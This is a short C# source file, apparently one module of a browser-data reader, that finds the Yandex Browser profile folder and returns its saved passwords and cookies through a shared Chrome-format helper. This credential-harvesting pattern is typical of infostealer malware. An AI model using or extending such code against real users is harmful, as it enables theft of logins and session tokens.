using System;
using System.Collections.Generic;
using System.IO;

namespace dao
{
    class Yandex : IReader
    {
        public string BrowserName { get { return "Yandex"; } }

        private readonly ChromeModel Model;

        public Yandex()
        {
            string LOCAL_PATH = ChromeModel.GetAppDataLocalPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"Yandex\YandexBrowser\User Data");
            Model = new ChromeModel(userDataPath);
        }

        public IEnumerable<PassModel> Passwords(string host = null)
        {
            return Model.ReadPassword(host);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host);
        }

    }
}
